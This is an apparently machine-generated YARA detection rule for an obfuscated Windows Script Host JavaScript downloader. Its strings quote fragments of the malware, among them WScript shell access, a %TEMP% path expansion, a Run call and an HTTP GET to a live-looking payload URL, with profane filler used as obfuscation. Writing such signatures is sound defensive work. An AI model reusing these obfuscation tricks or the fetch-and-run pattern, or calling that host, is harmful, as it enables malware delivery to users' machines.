rule sig_20160428_109588e7b6d00a786c27652c90a62ab1 {
  meta:
    description = "datamaliciousorder - file 20160428_109588e7b6d00a786c27652c90a62ab1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "df84a54d0929d2511d1cdee42920b55c696d2ff5595bae6bbb869059d5b73e43"

  strings:
    $s1  = "function GglWibIdpFcwWixIloLdh() {return WqdNxkEvkNnpJxsGsyVbf[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function EjjGkvEraJraGgxJuxUke(NazWzlVkvTycMfsBqcHfa){WqdNxkEvkNnpJxsGsyVbf[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function EjjGkvEraJraGgxJuxUke(NazWzlVkvTycMfsBqcHfa){WqdNxkEvkNnpJxsGsyVbf[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "var WqdNxkEvkNnpJxsGsyVbf = function YkxGseEdhHinYavRqyXnu() {return RrnJusSxlWjeHksDfsIid[PvmUjlJxlWknBtjSiaNqn](\"WScript\"+\"" ascii
    $s5  = "return WhxFrmJzlDkiVwuReiRed - MjoEwxEwmFbtWpfHbhKeg;};" fullword ascii
    $s6  = "function AawGgzHoxXscXhmCriEpd(WhxFrmJzlDkiVwuReiRed, MjoEwxEwmFbtWpfHbhKeg){IbzDihMkaDthGlmOlqOgg = IbzDihMkaDthGlmOlqOgg * 1; " ascii
    $s7  = "LuuOfhDqeOigCmvTkoNih[KhpWszCchErzXibDfpQvq](\"G\" + \"ET\", \"http://holy.webtm.ru/o4ksla\", false);" fullword ascii
    $s8  = "var WqdNxkEvkNnpJxsGsyVbf = function YkxGseEdhHinYavRqyXnu() {return RrnJusSxlWjeHksDfsIid[PvmUjlJxlWknBtjSiaNqn](\"WScript\"+\"" ascii
    $s9  = "var RrnJusSxlWjeHksDfsIid = this[\"WScript\"];" fullword ascii
    $s10 = "function GglWibIdpFcwWixIloLdh() {return WqdNxkEvkNnpJxsGsyVbf[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (LuuOfhDqeOigCmvTkoNih[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function AawGgzHoxXscXhmCriEpd(WhxFrmJzlDkiVwuReiRed, MjoEwxEwmFbtWpfHbhKeg){IbzDihMkaDthGlmOlqOgg = IbzDihMkaDthGlmOlqOgg * 1; " ascii
    $s13 = "function WqkFghDawXbqXteNhbGnj(){return ItrSbaKrgBxvYgsFdgOvt + \"\";};" fullword ascii
    $s14 = "return AawGgzHoxXscXhmCriEpd(1 == 1 ? JqrEleTvoMowByaAecOmj : 0, 1 == 1 ? AgrLccZiwIgvPjdOqbGlm : 0);" fullword ascii
    $s15 = "function CuvTjcKstUclFugXrpZfj() {return ((XprUbmTgkYmtBwrCifRfh == true) && (XprUbmTgkYmtBwrCifRfh == IafOalBbqEnkZhbRzzJce)) ?" ascii
    $s16 = "function CuvTjcKstUclFugXrpZfj() {return ((XprUbmTgkYmtBwrCifRfh == true) && (XprUbmTgkYmtBwrCifRfh == IafOalBbqEnkZhbRzzJce)) ?" ascii
    $s17 = "var JtfXkbHueBmzWvkChhNat = false;" fullword ascii
    $s18 = "}while (MxiKauTfvMpsNldCmrAde);" fullword ascii
    $s19 = "var WnyWslMtkCklIxwDlkEqv = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "var XprUbmTgkYmtBwrCifRfh = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}